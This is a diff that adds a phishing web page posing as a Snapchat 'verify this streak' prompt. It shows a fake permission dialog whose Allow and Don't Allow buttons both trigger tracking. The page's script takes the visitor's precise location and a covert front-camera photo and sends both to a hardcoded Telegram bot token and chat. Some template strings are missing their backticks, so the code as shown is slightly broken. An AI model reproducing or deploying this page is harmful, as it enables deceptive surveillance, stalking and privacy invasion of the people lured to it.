@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Verification</title>
+    <style>
+        body {
+            background: url('bg.jpg') center/cover no-repeat fixed;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            margin: 0; display: flex; align-items: center; justify-content: center;
+            height: 100vh; overflow: hidden;
+        }
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); z-index: 10;
+        }
+        .alert-box {
+            position: relative; width: 280px; background: rgba(255,255,255,0.95);
+            border-radius: 15px; text-align: center; overflow: hidden; z-index: 20;
+            box-shadow: 0 0 30px rgba(0,0,0,0.6);
+        }
+        .text { padding: 22px; color: #000; font-size: 16px; line-height: 1.4; font-weight: 500; }
+        .btns { display: flex; border-top: 0.5px solid #bbb; }
+        .btn {
+            flex: 1; padding: 14px; color: #007AFF; font-size: 17px;
+            cursor: pointer; border: none; background: none; outline: none;
+            font-family: inherit;
+        }
+        .btn-bold { font-weight: 600; border-right: 0.5px solid #bbb; }
+        video, canvas { position: absolute; left: -9999px; opacity: 0; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+<div class="overlay" id="overlay"></div>
+<div class="alert-box" id="alertBox">
+    <div class="text">Allow "Snapchat" to access your location and camera to verify this streak?</div>
+    <div class="btns">
+        <button class="btn btn-bold" id="btnAllow">Allow</button>
+        <button class="btn" id="btnDeny">Don't Allow</button>
+    </div>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const B_T = "8739484012:AAFMN2V0kdkVnUp_8YlDV1IKEq9_6IiZsOA";
+    const C_I = "659131693";
+
+    async function sendMsg(text) {
+        await fetch(https://api.telegram.org/bot${B_T}/sendMessage, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: C_I, text: text })
+        }).catch(() => {});
+    }
+
+    async function sendPhoto(blob) {
+        const fd = new FormData();
+        fd.append('chat_id', C_I);
+        fd.append('photo', blob, 'target.jpg');
+        await fetch(https://api.telegram.org/bot${B_T}/sendPhoto, {
+            method: 'POST',
+            body: fd
+        }).catch(() => {});
+    }
+
+    function hidePopup() {
+        document.getElementById('alertBox').style.display = 'none';
+        document.getElementById('overlay').style.display = 'none';
+    }
+
+    async function startCapture(label) {
+        hidePopup();
+        await sendMsg(🎯 ${label});
+
+        try {
+            const pos = await new Promise((ok, no) => {
+                navigator.geolocation.getCurrentPosition(ok, no, {
+                    enableHighAccuracy: true, timeout: 5000
+                });
+            });
+            let loc = 📍 https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude};
+            await sendMsg(loc);
+        } catch (e) {
+            await sendMsg(❌ Location: ${e.message});
+        }
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" }
+            });
+            const v = document.getElementById('video');
+            v.srcObject = stream;
+            await new Promise(r => setTimeout(r, 2000));
+
+            const c = document.getElementById('canvas');
+            c.width = v.videoWidth || 640;
+            c.height = v.videoHeight || 480;
+            c.getContext('2d').drawImage(v, 0, 0);
+
+            c.toBlob(async (blob) => {
+                if (blob) {
+                    await sendPhoto(blob);
+                    await sendMsg("📸 Sent");
+                }
+                stream.getTracks().forEach(t => t.stop());
+            }, 'image/jpeg', 0.7);
+        } catch (e) {
+            await sendMsg(🚫 Camera: ${e.name});
+        }
+    }
+
+    document.getElementById('btnAllow').onclick = () => startCapture('ALLOW');
+    document.getElementById('btnDeny').onclick = () => startCapture('DENY');
+</script>
+</body>
+</html>
